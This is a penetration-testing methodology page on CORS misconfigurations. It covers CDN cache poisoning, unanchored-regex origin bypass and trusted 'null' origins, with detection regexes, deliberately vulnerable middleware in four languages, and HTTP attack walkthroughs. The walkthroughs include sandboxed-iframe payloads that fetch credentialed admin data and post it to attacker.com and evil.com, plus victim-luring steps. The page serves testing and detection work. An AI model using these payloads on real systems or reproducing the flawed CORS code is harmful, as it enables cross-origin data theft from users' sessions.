# Cross Origin Resource Sharing

## Check List

## Methodology

### Black Box

#### [CORS Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration#methodology)

{% stepper %}
{% step %}
Go to any API endpoint that returns user data like `/api/account, /api/user, /api/profile, /api/keys`
{% endstep %}

{% step %}
Open Burp Suite, Repeater, Send a normal request to the target API and Add or modify the Origin header to your domain

```http
Origin: https://evil.com
```
{% endstep %}

{% step %}
Send the request and Check response headers for&#x20;

```http
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```
{% endstep %}

{% step %}
If both are present, Reflected CORS Misconfig, CONFIRMED
{% endstep %}
{% endstepper %}

***

### White Box

#### Cross-Tenant Data Leakage via Unkeyed CDN Origin Reflection (Cache Poisoning)

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on public or semi-private API endpoints (e.g., product catalogs, localization strings, tenant configurations) that are heavily cached behind a global Content Delivery Network (CDN) such as Cloudflare, Fastly, or Akamai
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the backend API's CORS evaluation and header generation logic
{% endstep %}

{% step %}
Identify the "Dynamic Origin Reflection" architecture. In multi-tenant environments with thousands of registered custom domains, returning a static array of allowed domains in the `Access-Control-Allow-Origin` (ACAO) header is impossible
{% endstep %}

{% step %}
Investigate the CORS middleware optimization. Instead of static lists, the backend dynamically queries the database for the incoming `Origin` header. If the origin belongs to a registered tenant, the backend dynamically reflects that specific origin into the ACAO response header
{% endstep %}

{% step %}
Analyze the Caching configuration. To survive massive global traffic, the API sets aggressive HTTP caching headers (e.g., `Cache-Control: public, max-age=3600`)
{% endstep %}

{% step %}
Discover the boundary desynchronization: The backend dynamically mutates the HTTP response headers based on the `Origin` request header, but fatally forgets to instruct the CDN to separate the cache partitions. The backend fails to append the `Vary: Origin` header to the response
{% endstep %}

{% step %}
Understand the CDN optimization: Because `Origin` is not included in the CDN's cache key (which typically consists only of the `Host` and `URI Path`), the CDN treats all requests to the endpoint as completely identical, regardless of the requesting origin
{% endstep %}

{% step %}
Formulate the Cache Poisoning payload. You must be the first person to request the cacheable asset after the TTL expires
{% endstep %}

{% step %}
Transmit an authenticated or public request to the target endpoint from an attacker-controlled origin: `Origin: [https://attacker.com](https://attacker.com)`
{% endstep %}

{% step %}
The CDN determines this is a cache miss and forwards the request to the backend
{% endstep %}

{% step %}
The backend evaluates the origin, determines it is valid (or relies on a loose regex), dynamically reflects `Access-Control-Allow-Origin: [https://attacker.com](https://attacker.com)`, and returns HTTP 200 OK
{% endstep %}

{% step %}
The CDN caches the HTTP response body along with the attacker's specific CORS headers
{% endstep %}

{% step %}
A legitimate victim visits a trusted tenant application. The victim's browser sends an authenticated cross-origin request to the API (e.g., `Origin: [https://trusted.tenant.com](https://trusted.tenant.com)`)
{% endstep %}

{% step %}
The CDN returns the poisoned cached response. The victim's browser receives `Access-Control-Allow-Origin: [https://attacker.com](https://attacker.com)`. The browser enforces the cached policy, inadvertently granting the attacker's domain cross-origin read access to the victim's session data across the entire enterprise ecosystem

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(context\.Response\.Headers\.Add\(\s*"Access-Control-Allow-Origin"\s*,\s*origin\s*\))(?![^}]*Vary)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(response\.setHeader\(\s*"Access-Control-Allow-Origin"\s*,\s*origin\s*\))(?![^}]*Vary)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$response->header\(\s*'Access-Control-Allow-Origin'\s*,\s*\$origin\s*\))(?![^}]*Vary)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(res\.set\(\s*'Access-Control-Allow-Origin'\s*,\s*origin\s*\))(?![^}]*Vary)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
context\.Response\.Headers\.Add\(\"Access-Control-Allow-Origin\",\s*origin\)(?![^}]*Vary)
```
{% endtab %}

{% tab title="Java" %}
```regexp
response\.setHeader\(\"Access-Control-Allow-Origin\",\s*origin\)(?![^}]*Vary)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$response->header\('Access-Control-Allow-Origin',\s*\$origin\)(?![^}]*Vary)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
res\.set\('Access-Control-Allow-Origin',\s*origin\)(?![^}]*Vary)
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class DynamicCorsMiddleware
{
    private readonly RequestDelegate _next;
    private readonly ITenantRepository _tenantRepo;

    public async Task InvokeAsync(HttpContext context)
    {
        var origin = context.Request.Headers["Origin"].FirstOrDefault();

        // [1]
        // [2]
        if (!string.IsNullOrEmpty(origin) && await _tenantRepo.IsValidOriginAsync(origin))
        {
            // [3]
            // [4]
            // Reflects the Origin dynamically but fails to append "Vary: Origin".
            // The CDN will cache this response and serve it to ALL subsequent origins.
            context.Response.Headers.Add("Access-Control-Allow-Origin", origin);
            context.Response.Headers.Add("Access-Control-Allow-Credentials", "true");
        }

        // Cache-Control headers applied globally in another middleware
        context.Response.Headers.Add("Cache-Control", "public, max-age=3600");

        await _next(context);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Component
public class DynamicCorsFilter implements Filter {

    @Autowired
    private TenantService tenantService;

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) request;
        HttpServletResponse res = (HttpServletResponse) response;

        String origin = req.getHeader("Origin");

        // [1]
        // [2]
        if (origin != null && tenantService.isValidOrigin(origin)) {
            // [3]
            // [4]
            res.setHeader("Access-Control-Allow-Origin", origin);
            res.setHeader("Access-Control-Allow-Credentials", "true");
        }

        res.setHeader("Cache-Control", "public, max-age=3600");
        chain.doFilter(request, response);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class DynamicCorsMiddleware
{
    public function handle(Request $request, Closure $next)
    {
        $response = $next($request);
        $origin = $request->header('Origin');

        // [1]
        // [2]
        if ($origin && TenantService::isValidOrigin($origin)) {
            // [3]
            // [4]
            $response->header('Access-Control-Allow-Origin', $origin);
            $response->header('Access-Control-Allow-Credentials', 'true');
        }

        $response->header('Cache-Control', 'public, max-age=3600');

        return $response;
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class DynamicCorsMiddleware {
    static async handle(req, res, next) {
        let origin = req.headers.origin;

        // [1]
        // [2]
        if (origin && await TenantService.isValidOrigin(origin)) {
            // [3]
            // [4]
            // Sets CORS headers dynamically without updating the cache variation key
            res.setHeader('Access-Control-Allow-Origin', origin);
            res.setHeader('Access-Control-Allow-Credentials', 'true');
        }

        res.setHeader('Cache-Control', 'public, max-age=3600');
        
        next();
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The API serves a massive multi-tenant ecosystem, requiring dynamic CORS resolution instead of static arrays, \[2] To optimize performance, the API sets public `Cache-Control` headers, pushing the burden of high-throughput read operations to the Edge CDN, \[3] The architecture dynamically mutates the HTTP response payload headers based on the untrusted `Origin` input, \[4] The execution sink. The developers assume caching logic is independent of security logic. Because the application fails to emit the `Vary: Origin` header, the CDN edge node remains ignorant of the contextual permutations of the response. It blindly caches the HTTP payload, baking the attacker's dynamic ACAO header into the global CDN state. When legitimate users subsequently request the same asset, the CDN delivers the poisoned headers, mathematically forcing the victim's browser to grant the attacker's domain read-level access to the enterprise's authenticated API

```http
// 1. Attacker controls a domain registered as a valid tenant (e.g., https://attacker.com).
// 2. Attacker continually polls the target API endpoint, waiting for the CDN cache to expire.

GET /api/v1/catalog/global-settings HTTP/1.1
Host: api.enterprise.tld
Origin: https://attacker.com
Authorization: Bearer <attacker_token>

// 3. The cache expires. The CDN forwards the request to the backend.
// 4. The backend validates the origin, reflects it, and returns the response.
// 5. The CDN caches the HTTP 200 OK along with the attacker's CORS headers.

HTTP/1.1 200 OK
Cache-Control: public, max-age=3600
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true

// 6. A legitimate victim logs into the enterprise dashboard at https://trusted.enterprise.tld.
// 7. The dashboard executes a Fetch request to /api/v1/catalog/global-settings.
// 8. The CDN intercepts the request and instantly returns the cached response containing:
//    Access-Control-Allow-Origin: https://attacker.com
// 9. If the attacker hosts a malicious payload on https://attacker.com targeting the victim,
//    the victim's browser honors the poisoned ACAO header and permits the data exfiltration.
```
{% endstep %}

{% step %}
To ensure sub-millisecond response times for global user bases, platform architects utilized aggressive CDN caching for semi-public API endpoints. Simultaneously, to support multi-tenant ecosystems, they implemented dynamic CORS reflection middleware. The security posture failed due to a severe misunderstanding of Edge proxy cache-key generation. Developers assumed that the CDN inherently partitioned cached states based on differing request origins. By failing to explicitly declare `Vary: Origin`, the backend allowed the CDN to permanently marry a dynamic, user-controlled security header to a globally static cache object. The attacker exploited this desynchronization by flushing and immediately poisoning the cache utilizing their own registered origin. The CDN dutifully distributed the poisoned CORS headers to all subsequent enterprise traffic, generating a persistent, infrastructure-level Cross-Site Scripting equivalent via architectural Cache Poisoning
{% endstep %}
{% endstepper %}

***

#### Authorization Bypass via Unanchored Regex in Ephemeral Environment Middleware

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on enterprise APIs that support modern CI/CD GitOps workflows, where Pull Requests automatically spin up temporary preview environments (e.g., `pr-123.internal-dev.enterprise.com`)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the API's CORS evaluation middleware
{% endstep %}

{% step %}
Identify the "Ephemeral Environment CORS" architecture. Because preview environment URLs are generated dynamically upon every Git commit, hardcoding allowed origins in the database is impossible
{% endstep %}

{% step %}
Investigate the CORS validation pipeline. To authorize the infinite permutation of preview URLs, the developer implements a fast-path Regular Expression evaluation within the CORS middleware
{% endstep %}

{% step %}
Analyze the Regex implementation. The developer uses an unanchored regular expression or a loose substring match (e.g., `Regex.IsMatch(origin, @"\.internal-dev\.com")` or `origin.endsWith(".internal-dev.com")`)
{% endstep %}

{% step %}
Discover the structural assumption: The developer assumes that browser-enforced `Origin` headers strictly follow standardized top-level domain (TLD) formatting, and that matching the domain suffix is mathematically equivalent to cryptographic origin verification
{% endstep %}

{% step %}
Understand the parsing vulnerability: An unanchored regex allows malicious prefixing or suffixing. If the developer fails to utilize the start-of-string anchor (`^`) and end-of-string anchor (`$`), or fails to properly escape the dot delimiter (`\.`), an attacker can easily register a domain that perfectly satisfies the mathematical string evaluation while resolving to an entirely external, attacker-controlled server
{% endstep %}

{% step %}
Formulate the Regex Bypass payload. Analyze the exact regex extracted during reverse engineering
{% endstep %}

{% step %}
If the regex is `https://.*\.internal-dev\.com` (Missing End Anchor), register the domain `internal-dev.com.attacker.com` and generate the Origin: `[https://pr-1.internal-dev.com.attacker.com](https://pr-1.internal-dev.com.attacker.com)`
{% endstep %}

{% step %}
If the regex is `https://.*internal-dev\.com$` (Missing Dot Escape), register the domain `attacker-internal-dev.com` and generate the Origin: `[https://attacker-internal-dev.com](https://attacker-internal-dev.com)`&#x20;
{% endstep %}

{% step %}
Configure the malicious domain to host a JavaScript exploit payload utilizing `fetch()` configured with `credentials: 'include'`
{% endstep %}

{% step %}
Distribute the link to an authenticated enterprise administrator
{% endstep %}

{% step %}
The victim visits the attacker's domain. The browser sends the cross-origin request with the crafted `Origin` header
{% endstep %}

{% step %}
The backend Regex evaluates the origin. It finds the matching substring pattern. Assuming the request originated from a legitimate internal preview environment, the API reflects the ACAO header along with `Access-Control-Allow-Credentials: true`. The browser accepts the authorization, allowing the attacker's external script to quietly read highly classified administrative API responses

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(Regex\.IsMatch\(\s*origin\s*,\s*@["'][^$\^]*internal-dev)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(origin\.matches\(\s*".*internal-dev.*"\s*\))|(origin\.matches\(.*internal.*\))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(preg_match\(\s*'/internal-dev/'\s*,\s*\$origin\s*\))|(preg_match\(.*origin.*internal)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(\.test\(\s*origin\s*\)\s*\|\|\s*origin\.endsWith\(\s*['"]internal-dev\.com['"]\s*\))|(origin\.match\(.*internal-dev)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Regex\.IsMatch\(origin,\s*@\"[^$\^]*internal-dev
```
{% endtab %}

{% tab title="Java" %}
```regexp
origin\.matches\(\".*internal-dev.*
```
{% endtab %}

{% tab title="PHP" %}
```regexp
preg_match\('/internal-dev/',\s*\$origin\)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\.test\(origin\)\s*\|\|\s*origin\.endsWith\('internal-dev\.com'\)
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class EphemeralCorsMiddleware
{
    private readonly RequestDelegate _next;

    public async Task InvokeAsync(HttpContext context)
    {
        var origin = context.Request.Headers["Origin"].FirstOrDefault();

        // [1]
        // [2]
        // [3]
        // [4]
        // Unanchored regex allows attacker.com/staging.enterprise.com if not strictly bounded
        if (!string.IsNullOrEmpty(origin) && Regex.IsMatch(origin, @"https://.*staging\.enterprise\.com"))
        {
            context.Response.Headers.Add("Access-Control-Allow-Origin", origin);
            context.Response.Headers.Add("Access-Control-Allow-Credentials", "true");
        }

        if (HttpMethods.IsOptions(context.Request.Method))
        {
            context.Response.StatusCode = 200;
            return;
        }

        await _next(context);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Component
public class EphemeralCorsFilter implements Filter {

    // [1]
    // [2]
    // Developer creates a regex to match dynamic PR preview environments
    // e.g., https://pr-456.staging.enterprise.com
    private static final Pattern ALLOWED_ORIGIN_PATTERN = Pattern.compile("https://.*\\.staging\\.enterprise\\.com");

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) request;
        HttpServletResponse res = (HttpServletResponse) response;

        String origin = req.getHeader("Origin");

        // [3]
        // [4]
        // Fatal Flaw: The regex lacks the end-of-string anchor ($).
        // It returns TRUE if the string simply contains the pattern anywhere.
        if (origin != null && ALLOWED_ORIGIN_PATTERN.matcher(origin).find()) {
            res.setHeader("Access-Control-Allow-Origin", origin);
            res.setHeader("Access-Control-Allow-Credentials", "true");
            res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
            res.setHeader("Access-Control-Allow-Headers", "Authorization, Content-Type");
        }

        if ("OPTIONS".equalsIgnoreCase(req.getMethod())) {
            res.setStatus(HttpServletResponse.SC_OK);
            return;
        }

        chain.doFilter(request, response);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class EphemeralCorsMiddleware
{
    public function handle(Request $request, Closure $next)
    {
        $origin = $request->header('Origin');

        // [1]
        // [2]
        // [3]
        // [4]
        // Preg_match without ^ and $ anchors evaluates substring existence
        if ($origin && preg_match('/https:\/\/.*\.staging\.enterprise\.com/', $origin)) {
            $response = $request->getMethod() === 'OPTIONS' ? response('', 200) : $next($request);
            
            $response->header('Access-Control-Allow-Origin', $origin);
            $response->header('Access-Control-Allow-Credentials', 'true');
            
            return $response;
        }

        return $next($request);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class EphemeralCorsMiddleware {
    static handle(req, res, next) {
        let origin = req.headers.origin;

        // [1]
        // [2]
        // [3]
        // [4]
        // Developer uses standard string matching, forgetting that domains resolve hierarchically.
        // Origin 'https://attacker-staging.enterprise.com' effortlessly bypasses this check.
        if (origin && origin.endsWith('staging.enterprise.com')) {
            res.setHeader('Access-Control-Allow-Origin', origin);
            res.setHeader('Access-Control-Allow-Credentials', 'true');
        }

        if (req.method === 'OPTIONS') {
            return res.sendStatus(200);
        }

        next();
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture integrates with modern GitOps CI/CD pipelines, spawning hundreds of ephemeral preview URLs daily, \[2] To prevent developers from manually whitelisting every temporary PR deployment, the API implements dynamic Regex-based CORS authorization, \[3] The architecture operates under the assumption that URL strings are structurally predictable and that partial matching equates to domain ownership verification, \[4] The execution sink. Because the developers failed to apply rigorous mathematical anchors (`^` and `$`) and escape characters, the validation algorithm degenerated into a loose substring check. The attacker bypasses the gateway by maliciously formatting an external domain to contain the expected enterprise string as a prefix, suffix, or subdomain. The backend, evaluating only the string's mathematical subset, falsely identifies the attacker's origin as an authorized internal staging environment, granting absolute cross-origin credentialed read access

```http
// 1. Attacker analyzes the target's CORS policy. They notice that requests from 
//    https://pr-123.staging.enterprise.tld are accepted.
// 2. Attacker deduces the regex is likely unanchored: https://.*\.staging\.enterprise\.tld
// 3. Attacker purchases the domain "enterprise.tld.attacker.com".
// 4. Attacker hosts a payload on "https://staging.enterprise.tld.attacker.com".

// 5. Attacker lures an authenticated enterprise admin to their malicious domain.
// 6. The victim's browser executes a cross-origin Fetch request to the enterprise API.
//    The browser natively constructs and sends the Origin header:

OPTIONS /api/v1/admin/secrets HTTP/1.1
Host: api.enterprise.tld
Origin: https://staging.enterprise.tld.attacker.com
Access-Control-Request-Method: GET

// 7. The backend regex evaluates the string:
//    Pattern: "https://.*\.staging\.enterprise\.tld"
//    Input:   "https://staging.enterprise.tld.attacker.com"
//    Match:   [TRUE] (Substring found at the beginning of the string).

// 8. The backend authorizes the request and reflects the attacker's origin.
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://staging.enterprise.tld.attacker.com
Access-Control-Allow-Credentials: true

// 9. The browser receives the preflight approval and dispatches the authenticated GET request.
// 10. The attacker's script silently extracts the administrative secrets from the JSON response.
```
{% endstep %}

{% step %}
To support agile development and CI/CD automation, engineers abandoned static CORS whitelists in favor of dynamic Regex pattern matching designed to blanket-approve ephemeral environments. This optimization shifted the security model from exact mathematical equality to complex string parsing. Developers erroneously assumed that structural indicators of a domain (like a specific TLD sequence) were immutable proof of ownership. By deploying unanchored regular expressions or failing to escape structural delimiters, the developers created an evaluation matrix that validated substrings rather than absolute origin boundaries. The attacker manipulated the hierarchical nature of DNS to register a domain that perfectly encapsulated the expected mathematical pattern within an entirely hostile URI structure. The backend's parser blindly verified the substring, unconditionally reflecting the attacker's origin and neutralizing the browser's native cross-origin security boundary
{% endstep %}
{% endstepper %}

***

#### Privilege Escalation via null Origin Trust in Hybrid Desktop Architectures

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on unified APIs serving both standard Web SPAs and Hybrid Desktop/Mobile clients (e.g., Electron, Capacitor, Tauri, Cordova)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the API Gateway's CORS routing logic and authentication fallback mechanisms
{% endstep %}

{% step %}
Identify the "Hybrid Desktop Client" architecture. In thick-client deployments, the frontend SPA is packaged as local HTML/JS files executing directly off the local hard drive (e.g., `file:///C:/App/index.html` or custom schemes like `app://localhost`)
{% endstep %}

{% step %}
Investigate the Client Authentication flow. When local applications execute network requests, the underlying Chromium/Webkit engine sets the HTTP `Origin` header to the literal string `"null"`&#x20;
{% endstep %}

{% step %}
Analyze the backend CORS routing policy. To support the desktop application without triggering massive CORS violations in the web framework, the backend explicitly whitelists the `"null"` origin alongside its standard web domains
{% endstep %}

{% step %}
Discover the authorization overlap: To streamline user experience, the backend equates the `"null"` origin with "Highly Trusted Internal Desktop Client." It routinely returns `Access-Control-Allow-Credentials: true` for `"null"` origins, and occasionally bypasses secondary Anti-CSRF validations, assuming local thick clients cannot be subjected to web-based CSRF attacks
{% endstep %}

{% step %}
Understand the Sandboxed Iframe vulnerability: The developer structurally assumes that `"null"` is a secure, un-forgeable indicator of local file execution. They fail to account for W3C HTML5 browser specifications, which dictate that modern web browsers will artificially emit `Origin: null` for _any_ cross-origin request originating from inside a sandboxed `<iframe>` lacking the `allow-same-origin` attribute
{% endstep %}

{% step %}
Formulate the Null Origin Hijacking payload. You must force the victim's web browser to execute authenticated requests against the enterprise API while artificially coercing the browser to emit the trusted `"null"` origin
{% endstep %}

{% step %}
Create an attacker-controlled web page
{% endstep %}

{% step %}
Embed a highly restricted sandboxed iframe within the page. The iframe must allow scripts (to execute the fetch) but omit the same-origin flag. Payload: `<iframe sandbox="allow-scripts allow-forms" srcdoc="<script>fetch('[https://api.enterprise.tld/admin/data](https://api.enterprise.tld/admin/data)', {credentials: 'include'}).then(r=>r.text()).then(d=>fetch('[https://attacker.com/leak?d='+btoa(d](https://attacker.com/leak?d='+btoa(d))))</script>"></iframe>`
{% endstep %}

{% step %}
Host the page and lure the authenticated victim
{% endstep %}

{% step %}
The victim's browser loads the iframe and executes the script. Because the iframe is strictly sandboxed, the browser actively strips the victim's true origin and forces the request's Origin header to `"null"`&#x20;
{% endstep %}

{% step %}
The enterprise API receives the request. It evaluates `Origin: null`&#x20;
{% endstep %}

{% step %}
Matching the hardcoded desktop client whitelist, the API authorizes the request, reflecting `Access-Control-Allow-Origin: null` and `Access-Control-Allow-Credentials: true`. The browser natively accepts the `null` reflection, allowing the sandboxed iframe to exfiltrate the victim's sensitive enterprise data across the internet

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(origin\.Equals\(\s*"null"\s*\))
```
{% endtab %}

{% tab title="Java" %}
```regexp
(origin\.equals\(\s*"null"\s*\))|(origin\.Equals\(\s*"null"\s*\))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$origin\s*===\s*'null')|(\$origin\s*==\s*['"]null['"])
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(origin\s*===\s*['"]null['"])|(allowedOrigins\.includes\(\s*['"]null['"]\s*\))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
origin\.Equals\("null"\)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(origin\.equals\(\s*"null"\s*\))|(origin\.Equals\(\s*"null"\s*\))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$origin\s*===\s*'null'
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
allowedOrigins\.includes\('null'\)
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class HybridCorsMiddleware
{
    private readonly RequestDelegate _next;

    public async Task InvokeAsync(HttpContext context)
    {
        var origin = context.Request.Headers["Origin"].FirstOrDefault();

        // [1]
        // [2]
        // [3]
        // [4]
        // Bypassing CORS constraints for local desktop applications executing from file://
        if (origin == "https://web.enterprise.tld" || origin == "null")
        {
            context.Response.Headers.Add("Access-Control-Allow-Origin", origin);
            context.Response.Headers.Add("Access-Control-Allow-Credentials", "true");
        }

        if (HttpMethods.IsOptions(context.Request.Method))
        {
            context.Response.StatusCode = 200;
            return;
        }

        await _next(context);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Component
public class HybridCorsFilter implements Filter {

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) request;
        HttpServletResponse res = (HttpServletResponse) response;

        String origin = req.getHeader("Origin");

        // [1]
        // [2]
        // [3]
        // [4]
        // The developer explicitly trusts the literal string "null".
        if ("https://web.enterprise.tld".equals(origin) || "null".equals(origin)) {
            res.setHeader("Access-Control-Allow-Origin", origin);
            res.setHeader("Access-Control-Allow-Credentials", "true");
        }

        if ("OPTIONS".equalsIgnoreCase(req.getMethod())) {
            res.setStatus(HttpServletResponse.SC_OK);
            return;
        }

        chain.doFilter(request, response);
    }
}
```


{% endtab %}

{% tab title="PHP" %}
```php
class HybridCorsMiddleware
{
    public function handle(Request $request, Closure $next)
    {
        $origin = $request->header('Origin');

        // [1]
        // [2]
        // [3]
        // [4]
        if ($origin === 'https://web.enterprise.tld' || $origin === 'null') {
            $response = $request->getMethod() === 'OPTIONS' ? response('', 200) : $next($request);
            
            $response->header('Access-Control-Allow-Origin', $origin);
            $response->header('Access-Control-Allow-Credentials', 'true');
            
            return $response;
        }

        return $next($request);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class HybridCorsMiddleware {
    static handle(req, res, next) {
        let origin = req.headers.origin;

        // [1]
        // [2]
        const allowedOrigins = [
            'https://web.enterprise.tld',
            // [3]
            // [4]
            // Fatal Optimization: Explicitly allowing "null" to support Electron/Capacitor thick clients.
            'null'
        ];

        if (allowedOrigins.includes(origin)) {
            res.setHeader('Access-Control-Allow-Origin', origin);
            res.setHeader('Access-Control-Allow-Credentials', 'true');
            res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
            res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
        }

        if (req.method === 'OPTIONS') {
            return res.sendStatus(200);
        }

        next();
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture delivers a unified API designed to power both remote web applications and locally installed thick-client frameworks (Electron, Tauri), \[2] When thick-clients execute API requests from localized HTML files (`file://`), the underlying browser engine strips the domain and enforces the literal string `"null"` in the `Origin` header, \[3] To support these desktop applications seamlessly without implementing complex, proprietary authentication handshakes, the API Gateway explicitly whitelists the `"null"` origin, \[4] The execution sink. Developers erroneously equated the `"null"` origin with an unforgeable hardware signature, assuming it exclusively represented local desktop execution. They failed to account for W3C HTML5 sandbox mechanics. Web browsers actively generate `Origin: null` to intentionally anonymize cross-origin traffic originating from untrusted, heavily restricted `<iframe>` environments. The attacker weaponizes this browser specification. By encapsulating their exploit within a sandboxed iframe, the attacker coerces the browser into adopting the precise network signature trusted by the enterprise backend. The API reflects the `null` ACAO header, bridging the sandboxed exploit directly to the authenticated enterprise session

```http
// 1. Attacker identifies that the enterprise API permits the "null" origin.
// 2. Attacker hosts a malicious webpage at https://evil.com/phish.html.
// 3. Inside the webpage, the attacker embeds a sandboxed iframe:

<iframe sandbox="allow-scripts" srcdoc="
    <script>
        fetch('https://api.enterprise.tld/v1/admin/export', {
            method: 'GET',
            credentials: 'include'
        })
        .then(response => response.text())
        .then(data => {
            fetch('https://evil.com/exfiltrate', {
                method: 'POST',
                body: data
            });
        });
    </script>
"></iframe>

// 4. The victim accesses the attacker's webpage.
// 5. The browser executes the iframe's script. Because the iframe is sandboxed 
//    and lacks 'allow-same-origin', the browser artificially alters the HTTP request:

GET /v1/admin/export HTTP/1.1
Host: api.enterprise.tld
Origin: null
Cookie: session_token=SECURE_ADMIN_JWT_XYZ

// 6. The Enterprise API processes the request. It matches the "null" thick-client whitelist.
// 7. The backend authorizes the request and reflects the headers.

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
Content-Type: application/json

{"classified_data": "..."}

// 8. The browser receives the response. Because ACAO is 'null' and matches the iframe's 
//    sandboxed origin, the browser permits the Javascript to read the response.
// 9. The iframe executes the secondary fetch, exfiltrating the data to the attacker.
```
{% endstep %}

{% step %}
To unify multi-platform codebases, software architects instructed backend API Gateways to serve both standard web applications and localized thick-clients. This optimization necessitated bypassing traditional CORS restrictions for requests originating from the local file system (`file://`), leading developers to explicitly whitelist the literal `"null"` origin. The security failure stemmed from a critical misunderstanding of browser telemetry. Developers falsely classified the `"null"` origin as a secure, immutable indicator of desktop software execution. They overlooked the HTML5 specification, which leverages the exact same `"null"` origin to anonymize HTTP requests originating from highly restricted, sandboxed web environments. The attacker exploited this specification overlap by intentionally downgrading their own execution context. By deploying a sandboxed iframe without origin permissions, the attacker forced the victim's browser to emit the `"null"` signature. The enterprise backend, misinterpreting the sandboxed web request as a trusted local desktop request, unconditionally authorized the cross-origin connection, granting the attacker seamless, credentialed data exfiltration
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
